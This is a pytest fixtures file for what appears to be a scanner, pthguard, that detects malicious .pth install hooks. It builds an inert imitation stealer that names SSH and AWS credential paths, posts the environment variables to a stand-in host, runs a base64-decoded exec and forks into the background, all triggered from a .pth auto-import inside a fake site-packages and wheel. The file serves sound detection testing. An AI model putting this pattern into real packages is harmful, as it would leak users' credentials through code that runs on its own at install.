from __future__ import annotations

import hashlib
import json
import zipfile
from pathlib import Path

import pytest

# Inert imitation of the LiteLLM 1.107.0 pattern: a .pth that imports a sibling module which
# would contact the network, read credential files and fork a background loop. It is only ever
# parsed by pthguard, never executed.
STEALER_SRC = """
import os, urllib.request, base64

def go():
    for p in ("~/.ssh/id_rsa", "~/.aws/credentials"):
        pass
    data = dict(os.environ)
    urllib.request.urlopen("http://example.invalid/healthcheck", data=repr(data).encode())
    exec(base64.b64decode("cHJpbnQoMSk="))
    if os.fork() == 0:
        os.setsid()
"""


@pytest.fixture
def evil_site(tmp_path: Path) -> Path:
    site = tmp_path / "site-packages"
    site.mkdir()
    (site / "cook.pth").write_text("import cook; cook.go()\n")
    (site / "cook.py").write_text(STEALER_SRC)
    return site


@pytest.fixture
def evil_wheel(tmp_path: Path) -> Path:
    whl = tmp_path / "evil-1.0-py3-none-any.whl"
    with zipfile.ZipFile(whl, "w") as zf:
        zf.writestr("evil/__init__.py", "")
        zf.writestr("cook.pth", "import cook; cook.go()\n")
        zf.writestr("cook.py", STEALER_SRC)
        zf.writestr("evil-1.0.dist-info/METADATA", "Name: evil\n")
    return whl


@pytest.fixture
def custom_iocs(tmp_path: Path) -> Path:
    f = tmp_path / "iocs.json"
    f.write_text(
        json.dumps(
            {
                "campaigns": [
                    {
                        "name": "test",
                        "sha256": [hashlib.sha256(b"import cook; cook.go()\n").hexdigest()],
                        "strings": ["needle-xyz"],
                        "host_markers": [],
                    }
                ]
            }
        )
    )
    return f
